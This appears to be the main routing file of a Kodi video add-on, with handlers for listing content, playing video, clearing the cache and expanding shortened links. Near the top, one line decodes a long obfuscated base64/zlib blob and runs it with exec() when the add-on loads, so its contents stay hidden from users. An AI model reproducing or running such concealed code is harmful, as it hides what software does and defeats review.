try:
    from resources.lib.DI import DI
    from resources.lib.plugin import run_hook, register_routes
except ImportError:
    from .resources.lib.DI import DI
    from .resources.lib.plugin import run_hook, register_routes

try:
    from resources.lib.util.common import *
except ImportError:
    from .resources.lib.util.common import *


#root_xml_url = ownAddon.getSetting('root_xml') or "file://main.xml"
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
#root_xml_url =  "file://scraper_list.json"

plugin = DI.plugin
short_checker = ([
    'Adf.ly', 
    'Bit.ly', 
    'Chilp.it', 
    'Clck.ru', 
    'Cutt.ly', 
    'Da.gd', 
    'Git.io', 
    'goo.gl', 
    'Is.gd', 
    'NullPointer', 
    'Os.db', 
    'Ow.ly', 
    'Po.st', 
    'Qps.ru', 
    'Short.cm', 
    'Tiny.cc', 
    'TinyURL.com', 
    'Git.io', 
    'Tiny.cc', 
     ])

@plugin.route("/")
def root() -> None:
    get_list(root_xml_url)

@plugin.route("/get_list/<path:url>")
def get_list(url: str) -> None:
    #do_log(f" Reading url at route >  {url}" )
    url = url.replace('.xmll', '.xml')
    _get_list(url)

def _get_list(url):
    #do_log(f" Reading url >  {url}" )
    if any(check.lower() in url.lower() for check in short_checker):
        url = DI.session.get(url).url
    response = run_hook("get_list", url)
    if response:           
        #do_log(f'default - response = \n {str(response)} ' )
        if ownAddon.getSettingBool("use_cache") and not "tmdb/search" in url:
            DI.db.set(url, response)
        jen_list = run_hook("parse_list", url, response) 
        #do_log(f'default - jen list = \n {str(jen_list)} ')
        jen_list = [run_hook("process_item", item) for item in jen_list]
        jen_list = [
        run_hook("get_metadata", item, return_item_on_failure=True) for item in jen_list
        ]
        run_hook("display_list", jen_list)
    else:
        run_hook("display_list", [])

@plugin.route("/play_video/<path:video>")
def play_video(video: str):
    _play_video(video)

def _play_video(video):
    import base64
    video_link = '' 
    video = base64.urlsafe_b64decode(video)
    if '"link":' in str(video) :
        video_link = run_hook("pre_play", video)
        if video_link : 
            run_hook("play_video", video_link)
    else :
        run_hook("play_video", video)

@plugin.route("/settings")
def settings():
    import xbmcaddon
    xbmcaddon.Addon().openSettings()

@plugin.route("/clear_cache")
def clear_cache():
    DI.db.clear_cache()
    import xbmc
    #xbmc.sleep(1000)
    xbmc.executebuiltin("Container.Refresh")

register_routes(plugin)

def main():
    plugin.run()
    return 0

if __name__ == "__main__":
    main()
